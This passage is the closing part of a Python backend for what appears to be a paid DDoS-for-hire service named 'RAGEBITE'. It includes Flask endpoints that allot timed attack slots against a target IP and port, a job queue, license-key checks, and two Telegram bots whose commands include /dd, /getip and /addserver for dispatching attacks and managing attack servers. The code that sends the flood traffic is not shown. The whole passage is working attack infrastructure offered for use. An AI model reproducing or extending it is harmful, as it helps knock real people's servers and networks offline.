        notify_owner_dd(f"⚔️ Attack: Slot #{slot_id} | {ip}:{port}")
        return jsonify({
            "status": "SLOT_ALLOTTED",
            "slot": slot_id,
            "end_time": end.strftime('%H:%M:%S')
        })
    else:
        add_to_queue(user_id, key, pkg, ip, port, time_sec)
        return jsonify({
            "status": "SLOTS_FULL",
            "queue_position": get_queue_position(user_id),
            "queue_total": get_queue_count()
        })


@flask_app.route('/api/captured', methods=['POST'])
def api_captured():
    if not check_auth():
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json or {}
    expiry, status = verify_key(data.get('key', ''))
    if status != "VALID":
        return jsonify({"status": "ERROR", "reason": status})
    notify_owner_dd(f"🎯 UDP: {data.get('ip')}:{data.get('port')}")
    return jsonify({"status": "OK"})


@flask_app.route('/api/health', methods=['GET'])
def api_health():
    return jsonify({"status": "OK"})


def run_flask():
    flask_app.run(host='0.0.0.0', port=API_PORT, debug=False, use_reloader=False)


# ============================================================
# 🚀 MAIN
# ============================================================
def main():
    print("=" * 60)
    print("⚡ RAGEBITE ALL-IN-ONE BACKEND ⚡")
    print("=" * 60)

    threading.Thread(target=run_flask, daemon=True).start()
    print(f"🌐 Flask API on port {API_PORT}")
    time.sleep(1)

    def run_verify_bot():
        v_app = Application.builder().token(VERIFY_BOT_TOKEN).build()
        v_app.add_handler(CommandHandler("start", v_start))
        v_app.add_handler(CommandHandler("verify", v_verify))
        v_app.add_handler(CommandHandler("mykey", v_mykey))
        v_app.add_handler(CommandHandler("genkey", v_genkey))
        v_app.add_handler(CommandHandler("delkey", v_delkey))
        v_app.add_handler(CommandHandler("diskey", v_diskey))
        v_app.add_handler(CommandHandler("enkey", v_enkey))
        v_app.add_handler(CommandHandler("maintenance", v_maintenance))
        v_app.add_handler(CommandHandler("listkeys", v_listkeys))
        v_app.add_handler(CommandHandler("slotson", v_slotson))
        print("🛡️ Verify Bot running...")
        v_app.run_polling(allowed_updates=Update.ALL_TYPES)

    threading.Thread(target=run_verify_bot, daemon=True).start()
    time.sleep(2)

    d_app = Application.builder().token(DD_BOT_TOKEN).post_init(dd_post_init).build()
    d_app.add_handler(CommandHandler("start", d_start))
    d_app.add_handler(CommandHandler("getip", d_getip))
    d_app.add_handler(CommandHandler("dd", d_dd_command))
    d_app.add_handler(CommandHandler("slots", d_slots))
    d_app.add_handler(CommandHandler("addapikey", d_addapikey))
    d_app.add_handler(CommandHandler("delapikey", d_delapikey))
    d_app.add_handler(CommandHandler("listapikeys", d_listapikeys))
    d_app.add_handler(CommandHandler("addserver", d_addserver))
    d_app.add_handler(CommandHandler("listservers", d_listservers))
    print("⚔️ DD Bot running...")
    print("=" * 60)
    print("✅ All systems online!")
    print("=" * 60)
    d_app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()
